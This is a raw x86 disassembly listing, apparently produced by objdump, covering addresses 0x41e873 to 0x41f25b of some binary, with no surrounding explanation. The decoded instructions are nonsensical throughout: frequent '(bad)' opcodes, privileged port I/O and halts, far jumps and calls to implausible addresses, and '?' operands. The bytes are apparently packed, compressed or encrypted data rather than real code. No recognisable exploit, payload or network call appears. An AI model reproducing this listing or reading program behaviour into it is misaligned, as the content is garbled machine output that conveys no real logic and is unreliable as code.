  41e873:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e840
  41e881:	push   esp
  41e882:	push   ecx
  41e883:	out    0x11,eax
  41e885:	inc    ebp
  41e886:	add    DWORD PTR [eax],eax
  41e888:	add    eax,0xfd000001
  41e88d:	ins    DWORD PTR es:[edi],dx
  41e88e:	dec    esp
  41e88f:	imul   esi,DWORD PTR [edx+0x33],0x47696ff0
  41e896:	fist   DWORD PTR [edi]
  41e898:	cmp    ebx,DWORD PTR [ebx+0x473e461b]
  41e89e:	push   esp
  41e89f:	xlat   BYTE PTR ds:[ebx]
  41e8a0:	sbb    eax,0xd623154f
  41e8a5:	mov    al,0xa9
  41e8a7:	data16 in al,dx
  41e8a9:	xor    eax,0xce0288f4
  41e8ae:	lods   al,BYTE PTR ds:[esi]
  41e8af:	jle    0x41e906
  41e8b1:	or     DWORD PTR [eax-0x53],ecx
  41e8b4:	sbb    ah,BYTE PTR [ecx-0x1]
  41e8b7:	push   ds
  41e8b8:	out    0x4a,eax
  41e8ba:	stc    
  41e8bb:	imul   edi,DWORD PTR [ecx-0x59],0x454734a4
  41e8c2:	inc    eax
  41e8c3:	xchg   ecx,eax
  41e8c4:	call   FWORD PTR [esi+0x9704f0c]
  41e8ca:	sbb    dl,al
  41e8cc:	sub    BYTE PTR [ecx-0x78],0x77
  41e8d0:	sti    
  41e8d1:	inc    esi
  41e8d2:	loopne 0x41e8fa
  41e8d4:	es loop 0x41e89c
  41e8d7:	xor    DWORD PTR [ebx-0x55467964],ecx
  41e8dd:	xor    eax,0x24eee9e4
  41e8e2:	mov    ecx,0x8bb01913
  41e8e7:	out    0xda,eax
  41e8e9:	ja     0x41e8c4
  41e8eb:	call   0xfdb76725
  41e8f0:	loop   0x41e902
  41e8f2:	pop    eax
  41e8f3:	sub    edx,esi
  41e8f5:	or     al,BYTE PTR [ebx+0x9]
  41e8f8:	aas    
  41e8f9:	or     al,0xd2
  41e8fb:	mov    esi,0xe8c1d3c7
  41e900:	cs loope 0x41e8c7
  41e903:	call   0xbc9c0f8b
  41e908:	add    al,0xb1
  41e90a:	nop
  41e90b:	adc    ebx,esi
  41e90d:	in     al,0xfc
  41e90f:	push   ebx
  41e910:	jge    0x41e8f8
  41e912:	rcr    edi,1
  41e914:	sub    al,0xc
  41e916:	cmp    DWORD PTR cs:[edx+0x7e],esp
  41e91a:	push   ss
  41e91b:	sahf   
  41e91c:	or     cl,BYTE PTR [ecx-0x4cdfa644]
  41e922:	jno    0x41e926
  41e924:	ror    ecx,0x3b
  41e927:	ret    0x4e45
  41e92a:	adc    BYTE PTR [edx],0x27
  41e92d:	imul   edi,DWORD PTR [edx],0x2e
  41e930:	in     al,0x54
  41e932:	jne    0x41e8d2
  41e934:	lods   al,BYTE PTR ds:[esi]
  41e935:	push   ebp
  41e936:	imul   ebp,DWORD PTR [eax],0x17
  41e939:	test   BYTE PTR [eax],dl
  41e93b:	add    BYTE PTR [edx],0xe4
  41e93e:	fucomip st,st(5)
  41e940:	jmp    0x78af72b7
  41e945:	or     al,bh
  41e947:	and    esp,DWORD PTR [edx-0x63fa1e43]
  41e94d:	or     DWORD PTR [edx-0x78772282],0xffffffe8
  41e954:	aam    0xcc
  41e956:	lock inc ecx
  41e958:	inc    ecx
  41e959:	push   0xed551572
  41e95e:	jmp    0xd4e191fd
  41e963:	xchg   ecx,eax
  41e964:	inc    eax
  41e965:	das    
  41e966:	xor    BYTE PTR [ebx+0x2ff44603],0x4f
  41e96d:	sbb    ebp,DWORD PTR ds:0x6971570e
  41e973:	mov    eax,ds:0x54e4160c
  41e978:	cli    
  41e979:	lods   eax,DWORD PTR ds:[esi]
  41e97a:	push   eax
  41e97b:	loopne 0x41e9e9
  41e97d:	mov    cs,WORD PTR [ecx+0x2b]
  41e980:	hlt    
  41e981:	pop    ebp
  41e982:	je     0x41e9c9
  41e984:	scas   eax,DWORD PTR es:[edi]
  41e985:	xchg   ebp,eax
  41e986:	add    DWORD PTR [ecx],eax
  41e988:	xchg   esi,eax
  41e989:	ins    BYTE PTR es:[edi],dx
  41e98a:	jae    0x41e9d6
  41e98c:	fidiv  WORD PTR [edx]
  41e98e:	mov    esi,DWORD PTR [edi+0xec]
	...
  41e9f4:	js     0x41e9f3
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	mov    dl,bl
  41ea02:	scas   al,BYTE PTR es:[edi]
  41ea03:	leave  
  41ea04:	push   ss
  41ea05:	inc    esi
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    eax,0x65000001
  41ea0d:	int    0xdc
  41ea0f:	repz cmp eax,0xa7b0d28b
  41ea15:	es pop ss
  41ea17:	mov    bl,0xb8
  41ea19:	push   cs
  41ea1a:	xchg   ecx,eax
  41ea1b:	popa   
  41ea1c:	pop    ss
  41ea1d:	xchg   ebx,eax
  41ea1e:	pushf  
  41ea1f:	dec    ecx
  41ea20:	lock imul ch
  41ea23:	pusha  
  41ea24:	rol    BYTE PTR [esi-0x51],1
  41ea27:	xlat   BYTE PTR ds:[ebx]
  41ea28:	les    esi,FWORD PTR [ecx+0x47]
  41ea2b:	mov    esi,?
  41ea2d:	aam    0x4a
  41ea2f:	add    BYTE PTR [edi+0x66712d90],0x33
  41ea36:	push   es
  41ea37:	cmp    bl,ah
  41ea39:	fdivr  QWORD PTR [esi-0x79]
  41ea3c:	stc    
  41ea3d:	sahf   
  41ea3e:	call   0xd16b17b0
  41ea43:	dec    esp
  41ea44:	in     eax,dx
  41ea45:	or     ch,ch
  41ea47:	out    0x50,eax
  41ea49:	lods   eax,DWORD PTR ds:[esi]
  41ea4a:	inc    ebx
  41ea4b:	rcr    DWORD PTR [ebx+0x60],cl
  41ea4e:	lds    esp,FWORD PTR [edi+0x6]
  41ea51:	ins    BYTE PTR es:[edi],dx
  41ea52:	inc    esp
  41ea53:	jl     0x41ea14
  41ea55:	cld    
  41ea56:	dec    ecx
  41ea57:	shl    BYTE PTR [ecx+0x528e71f8],cl
  41ea5d:	xchg   esp,eax
  41ea5e:	sbb    ecx,DWORD PTR [ebx]
  41ea60:	mov    al,0xef
  41ea62:	xor    ebp,DWORD PTR [eax+0x3e]
  41ea65:	fcomp  QWORD PTR [ecx*4+0xd035fb5]
  41ea6c:	inc    ebp
  41ea6d:	xchg   edx,eax
  41ea6e:	lea    esp,[eax]
  41ea70:	and    eax,0xa7cefc85
  41ea75:	data16 or ah,BYTE PTR [esi]
  41ea78:	enter  0x6f75,0x9b
  41ea7c:	and    DWORD PTR [edx-0x67],edi
  41ea7f:	cli    
  41ea80:	add    eax,0x895b5996
  41ea85:	dec    ecx
  41ea86:	or     BYTE PTR [eax+0x36],bh
  41ea89:	or     dl,bh
  41ea8b:	rcr    BYTE PTR [ebx+0x2aaa9a68],1
  41ea91:	mov    bh,0x20
  41ea93:	or     al,0x51
  41ea95:	pop    esi
  41ea96:	out    dx,eax
  41ea97:	iret   
  41ea98:	test   eax,0x50ee3538
  41ea9d:	pop    eax
  41ea9e:	cmp    bl,ah
  41eaa0:	jnp    0x41eb02
  41eaa2:	retf   0x4afb
  41eaa5:	inc    edi
  41eaa6:	stc    
  41eaa7:	rcr    bh,1
  41eaa9:	sbb    BYTE PTR [edi+0x29],dh
  41eaac:	mov    dl,0xd1
  41eaae:	fdivrp st(2),st
  41eab0:	(bad)
  41eab4:	dec    eax
  41eab5:	jb     0x41eac8
  41eab7:	arpl   WORD PTR [edi+0x1ec5ecd1],si
  41eabd:	call   0x8c326e45
  41eac2:	repnz lea eax,[eax-0x7]
  41eac6:	xor    al,0x2f
  41eac8:	in     eax,0x4f
  41eaca:	inc    esp
  41eacb:	dec    ecx
  41eacc:	mov    edx,0x18c06804
  41ead1:	adc    DWORD PTR [esi-0x73],0x1dcb09a
  41ead8:	ficom  DWORD PTR [ebp-0x7ddda22a]
  41eade:	lock (bad) 
  41eae0:	mov    ch,0xe9
  41eae2:	mov    BYTE PTR [ecx-0x40],0x29
  41eae6:	sbb    DWORD PTR [eax+edx*8+0x15dc930a],edi
  41eaed:	jbe    0x41eb20
  41eaef:	sub    al,0x6
  41eaf1:	mov    es,WORD PTR [ebp-0x56]
  41eaf4:	(bad)  
  41eaf5:	test   al,0xcf
  41eaf7:	in     eax,dx
  41eaf8:	sbb    DWORD PTR ds:0x712f3f13,ecx
  41eafe:	sbb    esp,0x8a29c07d
  41eb04:	xlat   BYTE PTR ds:[ebx]
  41eb05:	pop    esi
  41eb06:	jmp    0x41eaff
  41eb08:	mov    ecx,0x3103149
  41eb0d:	rcr    edx,1
  41eb0f:	jbe    0x41eace
	...
  41eb71:	add    BYTE PTR [eax],al
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x9a
  41eb81:	adc    bh,BYTE PTR [edi]
  41eb83:	icebp  
  41eb84:	sbb    eax,DWORD PTR [edi+0x1]
  41eb87:	add    BYTE PTR ds:0xf1000001,al
  41eb8d:	xchg   ecx,eax
  41eb8e:	and    al,0x3e
  41eb90:	push   ss
  41eb91:	popa   
  41eb92:	dec    ebp
  41eb93:	mov    al,0x3f
  41eb95:	xchg   esp,eax
  41eb96:	or     DWORD PTR ds:0x12adc184,edx
  41eb9c:	mov    al,ds:0x13035008
  41eba1:	fnstcw WORD PTR [esp+edi*8]
  41eba4:	sub    BYTE PTR [esi],bh
  41eba6:	fdivr  DWORD PTR [ebx]
  41eba8:	(bad)  
  41eba9:	or     ch,ah
  41ebab:	sub    ecx,DWORD PTR [eax+0x3c]
  41ebae:	int    0x2
  41ebb0:	cmp    esp,DWORD PTR [eax+0x78]
  41ebb3:	fs mov esp,0xc1933560
  41ebb9:	add    al,0x67
  41ebbb:	and    al,0x8
  41ebbd:	data16 cmc 
  41ebbf:	sub    BYTE PTR [esi],al
  41ebc1:	popf   
  41ebc2:	(bad)  
  41ebc3:	test   al,0xc5
  41ebc5:	out    0xdc,eax
  41ebc7:	sbb    esp,DWORD PTR [ebp-0x81090dc]
  41ebcd:	inc    esi
  41ebce:	cmp    al,0x54
  41ebd0:	push   edi
  41ebd1:	mov    dh,BYTE PTR ds:0x4f332a29
  41ebd7:	in     al,dx
  41ebd8:	cmp    eax,DWORD PTR [eax]
  41ebda:	bound  edi,QWORD PTR [ebx+0x31]
  41ebdd:	int    0x9e
  41ebdf:	mov    esp,0x1d287f9e
  41ebe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebe5:	mov    DWORD PTR ds:0x24ca967c,esi
  41ebeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebec:	cmp    eax,0xb0f33937
  41ebf1:	sbb    eax,0xa82b030c
  41ebf6:	lahf   
  41ebf7:	clc    
  41ebf8:	mov    esi,0xf5a42e7
  41ebfd:	push   ebx
  41ebfe:	jns    0x41ec2c
  41ec00:	add    bl,BYTE PTR [ecx-0x2e7ec0f8]
  41ec06:	ficomp WORD PTR [ebx]
  41ec08:	shl    BYTE PTR [ecx+0x2333ce90],0x38
  41ec0f:	xchg   edx,eax
  41ec10:	add    DWORD PTR ds:0x3f02c59a,0xd91d08e2
  41ec1a:	in     eax,0x33
  41ec1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec1d:	sar    DWORD PTR [edi+ecx*2],1
  41ec20:	data16 shr BYTE PTR [esi],1
  41ec23:	and    bh,al
  41ec25:	mov    al,0x7f
  41ec27:	and    ecx,esi
  41ec29:	lock test al,0x4
  41ec2c:	ds (bad) 
  41ec2f:	dec    ebx
  41ec30:	sbb    eax,0x492523f4
  41ec35:	leave  
  41ec36:	mov    cr7,edi
  41ec39:	or     al,0x33
  41ec3b:	sbb    DWORD PTR [eax],esp
  41ec3d:	int3   
  41ec3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec3f:	add    eax,0xef2b225c
  41ec44:	xchg   edi,eax
  41ec45:	mov    al,ds:0xa22fb00f
  41ec4a:	imul   esp,DWORD PTR ds:0xfda42e32,0x564e864b
  41ec54:	icebp  
  41ec55:	cs dec esp
  41ec57:	or     eax,0xb1d343ea
  41ec5c:	sti    
  41ec5d:	sub    al,0xb1
  41ec5f:	dec    esi
  41ec60:	addr16 call 0x5b4b752e
  41ec66:	xchg   ebp,eax
  41ec67:	jle    0x41ecbc
  41ec69:	aaa    
  41ec6a:	sbb    BYTE PTR [esi+0xb],dh
  41ec6d:	mov    edi,0xea2729bc
  41ec72:	loopne 0x41ecd8
  41ec74:	mov    esp,0xa36d4cbb
  41ec79:	inc    esp
  41ec7a:	sub    bh,bl
  41ec7c:	lods   al,BYTE PTR ds:[esi]
  41ec7d:	jecxz  0x41ec81
  41ec7f:	pop    esp
  41ec80:	call   FWORD PTR [ebx]
  41ec82:	cmp    BYTE PTR [eax],0x20
  41ec85:	jmp    0x40368074
  41ec8a:	mov    esi,0xd3f3c10a
  41ec8f:	mov    edx,0x96
	...
  41ecf4:	inc    ecx
  41ecf5:	icebp  
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x43475fd0
  41ed02:	pop    esp
  41ed03:	sahf   
  41ed04:	and    BYTE PTR [eax+0x1],cl
  41ed07:	add    BYTE PTR ds:0x27000001,al
  41ed0d:	(bad)  
  41ed0e:	xor    al,0x25
  41ed10:	xchg   dl,bl
  41ed12:	cs inc edx
  41ed14:	jmp    0x255325d9
  41ed19:	push   eax
  41ed1a:	xchg   esp,eax
  41ed1b:	pop    ds
  41ed1c:	cmp    ah,al
  41ed1e:	mov    eax,ds:0x8b6fe061
  41ed23:	stos   DWORD PTR es:[edi],eax
  41ed24:	sub    BYTE PTR [ebx+eax*2],0xcb
  41ed28:	push   ss
  41ed29:	adc    ah,bl
  41ed2b:	aam    0x8f
  41ed2d:	fcomp  DWORD PTR [eax]
  41ed2f:	xor    esp,DWORD PTR [esi+ecx*8+0x72]
  41ed33:	or     ecx,DWORD PTR [eax-0x1f7f4cb4]
  41ed39:	xor    ebp,DWORD PTR [esi]
  41ed3b:	sti    
  41ed3c:	retf   0xf9be
  41ed3f:	outs   dx,DWORD PTR ds:[esi]
  41ed40:	sbb    DWORD PTR [ecx+0x4288bfdd],0x511e4afe
  41ed4a:	inc    edi
  41ed4b:	jmp    0x41ed45
  41ed4d:	and    DWORD PTR [ecx+0x3aafcb29],edi
  41ed53:	repz jnp 0x41ed99
  41ed56:	sar    BYTE PTR [eax-0x10],0x98
  41ed5a:	mov    WORD PTR [edi-0x3c54abe3],?
  41ed60:	rol    BYTE PTR [edx+0x76de6c5c],cl
  41ed66:	scas   eax,DWORD PTR es:[edi]
  41ed67:	sbb    ecx,edi
  41ed69:	xor    cl,bl
  41ed6b:	mov    ds:0xb57ca9e2,al
  41ed70:	rol    BYTE PTR [edx+0x62880a5f],0x8f
  41ed77:	xor    cl,BYTE PTR [edx]
  41ed79:	sar    BYTE PTR [eax-0x470c6a86],cl
  41ed7f:	and    esp,DWORD PTR [eax+0x38]
  41ed82:	ss in  eax,0x4f
  41ed85:	xor    edi,eax
  41ed87:	mov    bh,0x96
  41ed89:	pop    esp
  41ed8a:	xor    al,0x7e
  41ed8c:	int3   
  41ed8d:	xchg   edx,eax
  41ed8e:	rcr    BYTE PTR [eax+eiz*1+0x68e16321],0x64
  41ed96:	imul   BYTE PTR [eax-0x15]
  41ed99:	inc    esp
  41ed9a:	fbstp  TBYTE PTR [ecx+edx*4+0x948035b]
  41eda1:	int    0x1e
  41eda3:	(bad)  
  41eda5:	push   ebx
  41eda6:	mov    DWORD PTR [ebx],0x7afc9c67
  41edac:	out    0xaa,eax
  41edae:	inc    esp
  41edaf:	add    DWORD PTR [eax-0xc],esp
  41edb2:	xor    BYTE PTR [eax+edx*8+0x24],al
  41edb6:	adc    BYTE PTR [ecx+edi*2-0x3351a54d],0x7b
  41edbe:	addr16 iret 
  41edc0:	adc    BYTE PTR [ecx+0x5b105265],dh
  41edc6:	or     eax,0xb31b47e3
  41edcb:	mov    al,ds:0xd4e697df
  41edd0:	jmp    0x41ed52
  41edd2:	int    0xc3
  41edd4:	push   esp
  41edd5:	scas   eax,DWORD PTR es:[edi]
  41edd6:	lods   al,BYTE PTR ds:[esi]
  41edd7:	xor    BYTE PTR [ecx-0x63f18df1],bl
  41eddd:	xchg   edx,eax
  41edde:	(bad)  
  41ede1:	and    al,0xdb
  41ede3:	mov    eax,0x60594239
  41ede8:	mov    ch,0xc6
  41edea:	into   
  41edeb:	inc    ebx
  41edec:	or     eax,0xb5b0ad21
  41edf1:	dec    eax
  41edf2:	xor    eax,0xec6f209
  41edf7:	dec    ebx
  41edf8:	imul   ebx,ecx,0x22
  41edfb:	int3   
  41edfc:	sbb    al,0xfd
  41edfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edff:	clc    
  41ee00:	ins    BYTE PTR es:[edi],dx
  41ee01:	imul   edx,edi,0xffffffa1
  41ee04:	ins    DWORD PTR es:[edi],dx
  41ee05:	xchg   esi,eax
  41ee06:	dec    edi
  41ee07:	xchg   esi,eax
  41ee08:	jo     0x41edc6
  41ee0a:	jo     0x41ed9a
  41ee0c:	mov    DWORD PTR [ecx],ebp
  41ee0e:	in     eax,dx
  41ee0f:	js     0x41eda1
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0x25b1:0x62d7ece7
  41ee85:	dec    ecx
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    eax,0xe0000001
  41ee8d:	push   esi
  41ee8e:	(bad)  
  41ee8f:	mov    ecx,0x5686e12e
  41ee94:	mov    esi,0xee7cd23f
  41ee99:	or     ah,bh
  41ee9b:	sub    bl,BYTE PTR [esi+0x73]
  41ee9e:	mov    esp,0xe1fa6927
  41eea3:	js     0x41ee45
  41eea5:	retf   
  41eea6:	pop    eax
  41eea7:	mov    edi,0x25d79948
  41eeac:	push   0xfb18b049
  41eeb1:	jmp    0x681:0xf46c2ff9
  41eeb8:	push   cs
  41eeb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eeba:	fs jmp 0x20e598d4
  41eec0:	jb     0x41ef1a
  41eec2:	loop   0x41eedc
  41eec4:	mov    eax,0x66ad3e1e
  41eec9:	loopne 0x41eebb
  41eecb:	xor    eax,DWORD PTR cs:[edx+edi*8]
  41eecf:	ret    
  41eed0:	outs   dx,DWORD PTR ds:[esi]
  41eed1:	(bad)  
  41eed2:	in     al,0xb4
  41eed4:	cdq    
  41eed5:	nop
  41eed6:	dec    edx
  41eed7:	scas   eax,DWORD PTR es:[edi]
  41eed8:	int    0x8f
  41eeda:	in     al,dx
  41eedb:	das    
  41eedc:	cmp    al,0x80
  41eede:	pop    edi
  41eedf:	sub    esp,esp
  41eee1:	(bad)  [edx+edi*8-0x6cd16daf]
  41eee8:	mov    ds:0xcc16cfa8,al
  41eeed:	push   ds
  41eeee:	mov    edi,0x45eac6ce
  41eef3:	pop    ebp
  41eef4:	sahf   
  41eef5:	outs   dx,BYTE PTR ds:[esi]
  41eef6:	mov    ebx,0x1a29629d
  41eefb:	xor    DWORD PTR [esi+eax*1+0x1e],ebx
  41eeff:	in     eax,0xac
  41ef01:	std    
  41ef02:	sti    
  41ef03:	push   esp
  41ef04:	clc    
  41ef05:	and    al,0xc8
  41ef07:	lds    ebp,FWORD PTR [edi+0x3ed7a109]
  41ef0d:	stc    
  41ef0e:	test   al,0x1f
  41ef10:	xchg   ebx,eax
  41ef11:	push   eax
  41ef12:	lahf   
  41ef13:	popa   
  41ef14:	test   al,0x5e
  41ef16:	inc    ebx
  41ef17:	iret   
  41ef18:	(bad)  
  41ef19:	dec    ebx
  41ef1a:	sbb    al,0x78
  41ef1c:	adc    bl,BYTE PTR [edi]
  41ef1e:	mov    DWORD PTR [ebx+0x457ed070],ebp
  41ef24:	xchg   esp,eax
  41ef25:	jb     0x41ef28
  41ef27:	jle    0x41ef4b
  41ef29:	rcr    BYTE PTR [eax+0x41],cl
  41ef2c:	cmc    
  41ef2d:	inc    DWORD PTR [edi]
  41ef2f:	add    edx,0x354030ed
  41ef35:	cmp    al,0x55
  41ef37:	lds    edi,FWORD PTR [edx+0x4e]
  41ef3a:	sub    al,0x30
  41ef3c:	js     0x41ef71
  41ef3e:	fdiv   st,st(0)
  41ef40:	push   ss
  41ef41:	shl    ah,1
  41ef43:	pop    eax
  41ef44:	mov    ebx,0x5d3af33a
  41ef49:	int3   
  41ef4a:	push   ecx
  41ef4b:	rcl    BYTE PTR [edx-0x15],0x37
  41ef4f:	int3   
  41ef50:	xchg   BYTE PTR [ebp-0x6642cf51],bh
  41ef56:	jae    0x41ef88
  41ef58:	push   esp
  41ef59:	and    BYTE PTR [edx],bl
  41ef5b:	(bad)  
  41ef5d:	add    DWORD PTR [ebx+ebx*1+0x63],edx
  41ef61:	cld    
  41ef62:	jmp    0xed00c2bd
  41ef67:	inc    ebx
  41ef68:	sbb    eax,0x3facae38
  41ef6d:	mov    esi,0xdbc345c8
  41ef72:	loop   0x41ef22
  41ef74:	push   ebx
  41ef75:	mov    edi,0xbf53eca
  41ef7a:	push   0xffffff8e
  41ef7c:	and    eax,0x755548f1
  41ef81:	or     BYTE PTR [edx],dh
  41ef83:	sbb    eax,0x3809db91
  41ef88:	aam    0x3f
  41ef8a:	pusha  
  41ef8b:	inc    ecx
  41ef8c:	pop    ebx
  41ef8d:	mov    BYTE PTR [edi+0x15],dl
  41ef90:	jmp    0x41ef92
	...
  41eff2:	add    BYTE PTR [eax],al
  41eff4:	mov    ecx,0xff25bf5d
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul ecx,DWORD PTR [edx-0x7d],0xffffff85
  41f003:	in     eax,0x2a
  41f005:	dec    edx
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    eax,0xef000001
  41f00d:	cli    
  41f00e:	sub    ebx,DWORD PTR [eax+0x1770df82]
  41f014:	fs push ebx
  41f016:	push   edi
  41f017:	mov    dh,0x67
  41f019:	jp     0x41f03d
  41f01b:	or     eax,0x70c45c5c
  41f020:	js     0x41f09d
  41f022:	mov    ds:0x7f706515,al
  41f027:	sbb    eax,0xc9ddab58
  41f02c:	jns    0x41f073
  41f02e:	sbb    DWORD PTR [eax-0x5b],eax
  41f031:	out    0x70,al
  41f033:	aas    
  41f034:	(bad)  
  41f035:	cmp    eax,DWORD PTR [ebx]
  41f037:	rol    DWORD PTR [ecx+esi*4-0x2c3db787],0x96
  41f03f:	lea    ebp,[eax+eax*8-0x5ec2df54]
  41f046:	or     DWORD PTR [edx-0x1],edi
  41f049:	add    BYTE PTR [edi+0x3e],bl
  41f04c:	dec    eax
  41f04d:	hlt    
  41f04e:	fdivr  DWORD PTR [edx-0x5e09019d]
  41f054:	addr16 mov eax,ds:0x74ca
  41f058:	jmp    FWORD PTR [edx]
  41f05a:	and    ecx,DWORD PTR [eax-0x627f186a]
  41f060:	pop    esi
  41f061:	push   es
  41f062:	jl     0x41f037
  41f064:	paddq  mm0,QWORD PTR [edx-0x3abe9367]
  41f06b:	pop    ebp
  41f06c:	adc    BYTE PTR [ebp-0x76],0xbe
  41f070:	cmp    ecx,DWORD PTR [eax+edi*2]
  41f073:	xor    ebp,DWORD PTR [edx+0x233f2c87]
  41f079:	jge    0x41f077
  41f07b:	icebp  
  41f07c:	sub    ch,BYTE PTR [edx+0x77]
  41f07f:	push   esi
  41f080:	push   edi
  41f081:	jb     0x41f0b4
  41f083:	push   ebx
  41f084:	pushf  
  41f085:	adc    bh,BYTE PTR ds:0x532c1839
  41f08b:	fsub   QWORD PTR [ecx]
  41f08d:	pop    esp
  41f08e:	dec    ecx
  41f08f:	lea    esi,[ebx-0x125f0919]
  41f095:	adc    ch,ch
  41f097:	ret    
  41f098:	lock mov al,0x1d
  41f09b:	out    0x21,eax
  41f09d:	aad    0x66
  41f09f:	sub    al,0x10
  41f0a1:	lock inc eax
  41f0a3:	xchg   esp,eax
  41f0a4:	aaa    
  41f0a5:	fild   QWORD PTR [eax+0x456e2769]
  41f0ab:	aad    0xf5
  41f0ad:	in     al,0x79
  41f0af:	xlat   BYTE PTR ds:[ebx]
  41f0b0:	aam    0x95
  41f0b2:	sar    ebp,1
  41f0b4:	lahf   
  41f0b5:	sub    BYTE PTR [eax+0x29],bl
  41f0b8:	out    0x1b,eax
  41f0ba:	pop    edi
  41f0bb:	adc    eax,0x19c269a6
  41f0c0:	add    eax,0x8ba8a02
  41f0c5:	ins    BYTE PTR es:[edi],dx
  41f0c6:	cmp    DWORD PTR [ebx+eax*2+0x4],0x7eed67e2
  41f0ce:	cwde   
  41f0cf:	sub    BYTE PTR [edi],0xb6
  41f0d2:	xchg   ebp,eax
  41f0d3:	cmp    DWORD PTR [esi+0x300762df],esi
  41f0d9:	inc    esi
  41f0da:	mov    edx,0x31bdac4c
  41f0df:	mov    edi,0xbd2cf7c2
  41f0e4:	enter  0x382c,0xdd
  41f0e8:	xchg   DWORD PTR [eax],ecx
  41f0ea:	leave  
  41f0eb:	repnz adc cl,0x22
  41f0ef:	fcmove st,st(5)
  41f0f1:	mov    esi,0xd20cbd3
  41f0f6:	dec    ebp
  41f0f7:	div    eax
  41f0f9:	outs   dx,BYTE PTR ds:[esi]
  41f0fa:	es pop ss
  41f0fc:	sbb    al,0xd7
  41f0fe:	cmp    eax,0x21d1b408
  41f103:	test   BYTE PTR ds:[eax-0x4c],ah
  41f107:	push   0xffffffdc
  41f109:	in     eax,0xfe
  41f10b:	ret    
  41f10c:	jmp    0x41f123
  41f10e:	popa   
  41f10f:	idiv   DWORD PTR [eax+eax*1+0x0]
	...
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4b2f:0xf49287e2
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    eax,0x9c000001
  41f18d:	imul   esi,DWORD PTR ds:0xa39d85d6,0xffffffb0
  41f194:	rcl    DWORD PTR [ecx],1
  41f196:	sbb    BYTE PTR ss:[edx+eiz*8],cl
  41f19a:	les    esp,FWORD PTR [eax]
  41f19c:	pushf  
  41f19d:	fldcw  WORD PTR [edx+0x53]
  41f1a0:	repz iret 
  41f1a2:	jl     0x41f1c0
  41f1a4:	fmul   QWORD PTR [ecx]
  41f1a6:	sub    ecx,DWORD PTR [ebx+0x1e]
  41f1a9:	push   esp
  41f1aa:	mov    cl,0x24
  41f1ac:	cmp    dl,bh
  41f1ae:	mov    al,0x92
  41f1b0:	je     0x41f1ef
  41f1b2:	add    BYTE PTR [esi+esi*2-0x7bdbce1],0xfb
  41f1ba:	add    dh,BYTE PTR [edx+0x23]
  41f1bd:	adc    eax,0x6f66cd06
  41f1c2:	xlat   BYTE PTR ds:[ebx]
  41f1c3:	and    ecx,DWORD PTR [ebx]
  41f1c5:	fst    QWORD PTR [ecx+0x67e0d90d]
  41f1cb:	inc    edx
  41f1cc:	add    DWORD PTR [ebp+esi*4+0x2c5093ff],eax
  41f1d3:	jo     0x41f1f4
  41f1d5:	pop    ecx
  41f1d6:	dec    eax
  41f1d7:	sbb    DWORD PTR [edi+0x7c],0x146f0033
  41f1de:	add    BYTE PTR [ebx],ch
  41f1e0:	mov    ecx,0x15c1efe0
  41f1e5:	dec    eax
  41f1e6:	xor    al,0x94
  41f1e8:	ret    
  41f1e9:	xchg   ebp,eax
  41f1ea:	dec    ebx
  41f1eb:	mov    esp,0xb1214069
  41f1f0:	fild   DWORD PTR [esi+esi*1]
  41f1f3:	push   es
  41f1f4:	int3   
  41f1f5:	ret    
  41f1f6:	test   BYTE PTR [edi-0x43],bh
  41f1f9:	mov    ecx,es
  41f1fb:	inc    ebp
  41f1fc:	aad    0xe0
  41f1fe:	stc    
  41f1ff:	xor    eax,0x3b88ebf8
  41f204:	xchg   ebx,eax
  41f205:	mov    eax,ds:0x6e9cad38
  41f20a:	or     eax,0xaf97c2
  41f20f:	xchg   ebx,eax
  41f210:	pop    ebp
  41f211:	outs   dx,DWORD PTR ds:[esi]
  41f212:	cmp    al,0xd1
  41f214:	push   eax
  41f215:	sbb    ebp,DWORD PTR [ebx]
  41f217:	(bad)  
  41f219:	mov    esi,0x3ef5516c
  41f21e:	xor    al,0xf9
  41f220:	push   ss
  41f221:	rol    ecx,cl
  41f223:	mov    dl,0x4e
  41f225:	sub    BYTE PTR [eax+0x6ac044ca],bl
  41f22b:	adc    ah,BYTE PTR [esi+0xa]
  41f22e:	adc    esi,edi
  41f230:	fistp  DWORD PTR [edx+0x21]
  41f233:	sub    dl,BYTE PTR [edi+0x7b]
  41f236:	imul   esp,DWORD PTR [edx],0xf61782b4
  41f23c:	add    DWORD PTR [edx-0x4],eax
  41f23f:	arpl   di,bp
  41f241:	mov    edi,?
  41f243:	inc    ebp
  41f244:	call   DWORD PTR [ecx]
  41f246:	push   edx
  41f247:	adc    eax,0xfd724c41
  41f24c:	inc    edx
  41f24d:	mov    ebp,0x74e50574
  41f252:	jge    0x41f296
  41f254:	and    al,0x93
  41f256:	hlt    
  41f257:	jnp    0x41f295
  41f259:	sub    al,0x8
  41f25b:	imul   edx,DWORD PTR [edi-0x2e47a51e],0x26
